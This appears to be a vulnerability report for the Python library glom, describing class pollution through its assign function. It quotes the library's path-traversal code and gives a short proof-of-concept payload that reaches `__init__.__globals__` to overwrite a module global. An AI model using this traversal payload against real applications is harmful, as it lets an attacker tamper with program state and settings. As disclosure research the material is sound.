## glom

### Meta

+ Library: glom
+ Stars: 1.9K
+ Version: v24.11.0
+ CVE: N/A
+ Status: Pending
+ Payload: ```glom.assign(obj, '__init__.__globals__.__name__', 'polluted')```
+ Foundby: BlackPyrl
+ Report: Pending
+ Type: Lib
+ Exploitability: High


### Library

https://github.com/mahmoud/glom

### Vulnerable Code Snippet

The `glom` library don't filter the sensitive keys in the path which could allow attack manipulate the global object's attributes through the assign function call.

```
https://github.com/mahmoud/glom/blob/920c13c4a8719237f687f98afe3f2b8d1c56640d/glom/core.py#L1538-L1656
def _t_eval(target, _t, scope):
    t_path = _t.__ops__
    i = 1
    fetch_till = len(t_path)
    root = t_path[0]
    if root is T:
        cur = target
    elif root is S or root is A:
        # A is basically the same as S, but last step is assign
        if root is A:
            fetch_till -= 2
            if fetch_till < 1:
                raise BadSpec('cannot assign without destination')
        cur = scope
        if fetch_till > 1 and t_path[1] in ('.', 'P'):
            cur = _s_first_magic(cur, t_path[2], _t)
            i += 2
        elif root is S and fetch_till > 1 and t_path[1] == '(':
            # S(var='spec') style assignment
            _, kwargs = t_path[2]
            scope.update({
                k: arg_val(target, v, scope) for k, v in kwargs.items()})
            return target

    else:
        raise ValueError('TType instance with invalid root')  # pragma: no cover
    pae = None
    while i < fetch_till:
        op, arg = t_path[i], t_path[i + 1]
        arg = arg_val(target, arg, scope)
        if op == '.':
            try:
                cur = getattr(cur, arg)
            except AttributeError as e:
                pae = PathAccessError(e, Path(_t), i // 2)
        elif op == '[':
            try:
                cur = cur[arg]
            except (KeyError, IndexError, TypeError) as e:
                pae = PathAccessError(e, Path(_t), i // 2)
        elif op == 'P':
            # Path type stuff (fuzzy match)
            get = scope[TargetRegistry].get_handler('get', cur, path=t_path[2:i+2:2])
            try:
                cur = get(cur, arg)
            except Exception as e:
                pae = PathAccessError(e, Path(_t), i // 2)
```

```
def _assign_op(dest, op, arg, val, path, scope):
    """helper method for doing the assignment on a T operation"""
    if op == '[':
        dest[arg] = val
    elif op == '.':
        setattr(dest, arg, val)
    elif op == 'P':
        _assign = scope[TargetRegistry].get_handler('assign', dest)
        try:
            _assign(dest, arg, val)
        except Exception as e:
            raise PathAssignError(e, path, arg)
    else:  # pragma: no cover
        raise ValueError('unsupported T operation for assignment')
```

### PoC

```
from glom import assign
import random

class Animal:
  def __init__(self, typ, age):
      self.type = typ
      self.age = age
      self.id = random.randint(1, 99999)

obj = Animal('cat', 11)

print(assign(obj, '__init__.__globals__.__name__', 'polluted'))

print(__name__)
```